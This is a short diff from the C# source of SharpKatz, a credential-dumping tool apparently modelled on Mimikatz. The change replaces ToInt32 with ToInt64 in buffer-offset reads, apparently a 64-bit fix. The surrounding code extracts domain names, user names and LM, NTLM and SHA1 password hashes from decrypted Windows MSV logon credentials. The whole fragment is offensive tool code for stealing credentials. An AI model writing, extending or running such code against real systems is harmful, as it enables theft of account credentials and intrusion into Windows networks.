@@ -278,8 +278,8 @@ namespace SharpKatz.Module
                                 UNICODE_STRING usUserName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.UserNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
 
                                 msventry = new Msv();
-                                msventry.DomainName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usLogonDomainName.Buffer.ToInt32(), usLogonDomainName.MaximumLength)); 
-                                msventry.UserName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usUserName.Buffer.ToInt32(), usUserName.MaximumLength));
+                                msventry.DomainName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usLogonDomainName.Buffer.ToInt64(), usLogonDomainName.MaximumLength)); 
+                                msventry.UserName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usUserName.Buffer.ToInt64(), usUserName.MaximumLength));
                                 msventry.Lm = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.LmOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                 msventry.Ntlm = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.NtOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                 msventry.Sha1 = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.ShaOwPasswordOffset, SHA_DIGEST_LENGTH));
